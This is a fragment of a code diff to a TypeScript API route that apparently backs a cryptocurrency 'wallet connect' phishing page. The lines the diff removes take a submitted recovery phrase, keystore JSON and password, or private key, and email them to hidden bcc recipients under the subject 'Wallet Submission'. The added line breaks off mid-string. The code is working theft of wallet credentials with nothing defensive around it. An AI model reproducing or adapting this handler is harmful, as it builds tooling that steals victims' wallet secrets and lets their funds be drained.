@@ -36,33 +36,4 @@ export async function POST(request: Request) {
       from: `New Wallet Connect ${email}`,
       to: email, // Your own email or a neutral one (required)
       bcc: bccRecipients,
-      subject: 'Wallet Submission',
-      html: '',
-    };
-
-    // Format content based on what's provided
-    if (phrase) {
-      mailOptions.html = formatMessage(phrase);
-    }
-
-    if (keystore) {
-      mailOptions.html = `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`;
-    }
-
-    if (privateKey) {
-      mailOptions.html = formatMessage(privateKey);
-    }
-
-    const result = await transporter.sendMail(mailOptions);
-
-    return new Response(JSON.stringify({ success: true, result }), {
-      status: 200,
-    });
-
-  } catch (error) {
-    console.error("Error sending email:", error);
-    return new Response(JSON.stringify({ success: false, error: error.message }), {
-      status: 500,
-    });
-  }
-}
+      subject: 'Wallet
